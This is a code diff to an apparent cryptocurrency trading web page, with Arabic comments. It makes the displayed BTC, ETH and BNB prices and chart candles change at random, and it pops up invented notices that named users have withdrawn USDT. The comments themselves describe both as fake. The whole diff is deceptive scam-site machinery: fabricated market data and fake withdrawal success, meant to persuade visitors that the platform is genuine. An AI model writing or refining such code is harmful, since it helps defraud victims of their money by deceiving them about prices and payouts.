 
-        // أرقام وهمية متغيرة
+        // تحديث الأرقام والأسهم وهمياً كل ثانية
         setInterval(() => {
-            const btc = 94000 + (Math.random() * 400);
-            document.getElementById('marketPrice').innerText = btc.toFixed(2) + "+";
-            document.querySelector('.btc-val').innerText = "$" + btc.toFixed(0);
-        }, 2000);
+            const btc = 96000 + (Math.random() * 500);
+            const eth = 3400 + (Math.random() * 50);
+            const bnb = 650 + (Math.random() * 10);
+            
+            document.getElementById('liveTicker').innerText = "$" + btc.toFixed(2) + " ▲";
+            document.querySelector('.val-btc').innerText = "$" + btc.toFixed(0);
+            document.querySelector('.val-eth').innerText = "$" + eth.toFixed(0);
+            document.querySelector('.val-bnb').innerText = "$" + bnb.toFixed(2);
 
-        // إشعارات سحب وهمية كل 10 ثواني
-        const names = ["أبو فهد", "عمر", "سارة", "محمد", "ياسر", "ليلى"];
+            // تغيير عشوائي لأطوال الشموع
+            document.querySelectorAll('.candlestick').forEach(c => {
+                c.style.height = (Math.random() * 60 + 20) + "%";
+            });
+        }, 1500);
+
+        // إشعارات سحب وهمية كل 10-12 ثانية
+        const userNames = ["أحمد", "أبو ريان", "سارة", "خالد", "ليلى", "نواف", "ياسر"];
         setInterval(() => {
-            const u = names[Math.floor(Math.random() * names.length)];
-            const amt = (Math.random() * 500 + 100).toFixed(2);
-            document.getElementById('notifMsg').innerText = `المستخدم ${u}*** سحب ${amt} USDT بنجاح ✅`;
-            const pop = document.getElementById('fakeNotif');
-            pop.style.display = 'block';
-            setTimeout(() => pop.style.display = 'none', 4000);
+            const name = userNames[Math.floor(Math.random() * userNames.length)];
+            const amt = (Math.random() * 400 + 50).toFixed(2);
+            document.getElementById('notifText').innerText = `قام المستخدم ${name}*** بسحب ${amt} USDT بنجاح ✅`;
+            const box = document.getElementById('fakeNotif');
+            box.style.display = 'block';
+            setTimeout(() => box.style.display = 'none', 4000);
         }, 12000);
+
     </script>
 </body>
 </html>
